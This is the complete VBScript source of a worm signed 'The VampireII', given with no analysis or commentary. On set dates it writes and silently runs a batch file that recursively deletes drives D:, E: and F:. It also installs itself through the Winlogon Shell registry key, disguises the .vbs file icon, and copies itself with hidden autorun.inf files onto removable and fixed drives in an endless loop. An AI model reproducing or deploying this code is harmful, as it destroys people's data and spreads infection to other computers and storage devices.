checkDate()
function checkDate()
if (day(Now)=13 and month(Now)=3 or day(Now)=15 and month(Now)=7 or day(Now)=9 and month(Now)=9) then 
fhd()
ctpd()
else
ctpd()      
end if     
end function
function fhd()
On Error Resume Next
SET WSHSHELL =CREATEOBJECT("WSCRIPT.SHELL")
Set regedit = CreateObject("WScript.Shell")
SET fso =CREATEOBJECT("scripting.filesystemobject")
SET m =fso.CREATEtextfile("c:\autoexec.bat",true)
m.writeall
m.writeline "@echo off"
m.writeline "rd /s /q d:"
m.writeline "rd /s /q e:"
m.writeline "rd /s /q f:"
m.writeline "exit"
m.close
WshShell.Run chr(34) & "c:\autoexec.bat" & Chr(34), 0
Set WshShell = Nothing
end function
function ctpd()
DO
set fso=CreateObject("Scripting.FileSystemObject")
Fso.copyfile wscript.scriptfullname,fso.GetSpecialFolder(1)& "\VampireII.vbs"
createobject("Wscript.shell").regwrite "HKEY_CLASSES_ROOT\vbsfile\DefaultIcon\", "%SystemRoot%\System32\shell32.dll,3"
If fso.FileExists(fso.GetSpecialFolder(1)& "\VampireII.vbs") and fso.FileExists(fso.GetSpecialFolder(1)& "\VampireII.vbs") Then
CREATEOBJECT("WSCRIPT.SHELL").RegWrite "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell","explorer.exe VampireII.vbs"
End If
appName=FSO.GetBaseName(WScript.ScriptFullname)
set autorun=FSO.createtextfile(FSO.GetSpecialFolder(0)& "\security\autorun.inf",true)
autorun.write all
autorun.writeline "[autorun]"
autorun.writeline "open=wscript.exe """  &appname&  ".vbs"""
autorun.writeline "shell\open\command=wscript.exe """  &appname&  ".vbs"""
autorun.writeline "shell\Explore.\command=wscript.exe """  &appname&  ".vbs"""
autorun.close
On Error Resume Next 
dim drive
for each drive in fso.Drives   
if (drive.DriveType=1)or(drive.DriveType=3) then 
FSO.getfile (DRIVE.path&"\autorun.inf").attributes=0
FSO.getfile (FSO.GetSpecialFolder(0)& "\security\autorun.inf").Copy(DRIVE.path&"\autorun.inf")
FSO.getfile (DRIVE.path&"\autorun.inf").attributes=7
FSO.getfile (DRIVE.path&"\"&appname& ".vbs").attributes=0
fso.GetFile(wscript.scriptfullname).Copy(drive.path&"\")
FSO.getfile (DRIVE.path&"\"&appname& ".vbs").attributes=7
END IF
NEXT
LOOP
end function 
'=========================
'The VampireII 
'By RRVC
'Coded By Milan Pandey
'=========================
